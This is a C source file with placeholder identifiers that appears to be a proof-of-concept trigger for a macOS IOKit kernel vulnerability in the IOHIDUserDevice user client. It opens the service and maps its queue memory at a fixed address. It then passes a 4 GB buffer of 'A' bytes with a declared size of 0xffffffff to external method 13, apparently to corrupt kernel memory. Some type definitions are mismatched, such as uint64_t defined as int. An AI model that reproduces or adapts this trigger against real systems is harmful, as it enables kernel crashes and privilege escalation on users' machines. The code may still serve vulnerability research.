
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint64_t ;
typedef scalar_t__ uint32_t ;
typedef int mach_vm_size_t ;
typedef scalar_t__ mach_vm_address_t ;
typedef scalar_t__ kern_return_t ;
typedef scalar_t__ io_service_t ;
typedef int io_connect_t ;


 scalar_t__ FUNC_0 (int ,int,int*,int,char*,int,int*,scalar_t__*,char*,size_t*) ;
 scalar_t__ FUNC_1 (int ,int ,int ,scalar_t__*,int*,int ) ;
 scalar_t__ FUNC_2 (int ,int ) ;
 int FUNC_3 (char*) ;
 scalar_t__ FUNC_4 (scalar_t__,int ,int ,int *) ;
 scalar_t__ VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int FUNC_5 () ;
 int VAR_3 ;
 int FUNC_6 () ;
 char* FUNC_7 (int) ;
 int FUNC_8 (char*,char,int) ;
 int FUNC_9 (char*,...) ;

int FUNC_10(int VAR_4, char** VAR_5){
  FUNC_9("pid: %d\n", FUNC_5());
  kern_return_t VAR_6;

  io_service_t VAR_7 = FUNC_2(VAR_3, FUNC_3("IOHIDUserDevice"));

  if (VAR_7 == VAR_0){
    FUNC_9("unable to find service\n");
    return 0;
  }

  io_connect_t VAR_8 = VAR_2;
  VAR_6 = FUNC_4(VAR_7, FUNC_6(), 0, &VAR_8);
  if (VAR_6 != VAR_1){
    FUNC_9("unable to get user client connection\n");
    return 0;
  }

  FUNC_9("got client\n");

  uint64_t VAR_9[16];
  uint64_t VAR_10 = 0;

  char VAR_11[4096];
  size_t VAR_12 = 0;

  uint64_t VAR_13[16];
  uint32_t VAR_14 = 0;

  char VAR_15[4096];
  size_t VAR_16 = 0;



  VAR_9[0] = 0;
  VAR_10 = 1;

  VAR_6 = FUNC_0(
    VAR_8,
    1,
    VAR_9,
    VAR_10,
    VAR_11,
    VAR_12,
    VAR_13,
    &VAR_14,
    VAR_15,
    &VAR_16);

  if (VAR_6 != VAR_1){
    FUNC_9("IOConnectCall error: %x\n", VAR_6);
    return 0;
  }

  FUNC_9("called external method open\n");

  mach_vm_address_t VAR_17 = 0x4100000000;
  mach_vm_size_t VAR_18 = 0x1000;

  VAR_6 = FUNC_1(VAR_8, 0, FUNC_6(), &VAR_17, &VAR_18, 0);
  if (VAR_6 != VAR_1){
    FUNC_9("IOConnectMapMemory failed:0x%x\n", VAR_6);
    return 0;
  }

  FUNC_9("mapped queue memory here: %016llx\n", VAR_17);

  char* VAR_19 = FUNC_7(0x100000000);
  FUNC_8(VAR_19, 'A', 0x100000000);

  VAR_9[0] = 0x0;
  VAR_9[1] = 0x0;
  VAR_10 = 3;
  VAR_14 = 0;

  VAR_6 = FUNC_0(
    VAR_8,
    13,
    VAR_9,
    VAR_10,
    VAR_19,
    0xffffffff,
    VAR_13,
    &VAR_14,
    VAR_15,
    &VAR_16);

  if (VAR_6 != VAR_1){
    FUNC_9("IOConnectCall error: %x\n", VAR_6);
    return 0;
  }

  return 0;
}
